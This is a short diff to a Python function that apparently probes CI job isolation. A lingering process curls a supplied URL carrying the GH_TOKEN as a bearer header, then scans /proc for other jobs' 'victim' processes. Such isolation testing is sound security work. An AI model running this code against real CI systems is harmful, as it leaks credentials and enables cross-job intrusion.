@@ -368,6 +368,14 @@ def leftover(url, seconds):
         os.dup2(null, fd)
     me = os.getpid()
     end = time.time() + float(seconds)
+    # First its own job's authority, after that job ended (A's stand-in and
+    # proxy settings, which this process still holds).
+    time.sleep(2)
+    own = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url + "a",
+                          "-H", "Authorization: Bearer " + os.environ.get("GH_TOKEN", "")],
+                         capture_output=True, text=True)
+    first = f"OWN status={own.stdout.strip() or 'none'} curl={own.returncode}"
+    url = url + "b"
     said = "NOVICTIM"
     while time.time() < end and said == "NOVICTIM":
         for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != me]:
@@ -386,7 +394,7 @@ def leftover(url, seconds):
             break
         time.sleep(0.3)
     with open(out, "w") as f:
-        f.write(said + "\n")
+        f.write(first + "; " + said + "\n")
     os._exit(0)
 
 
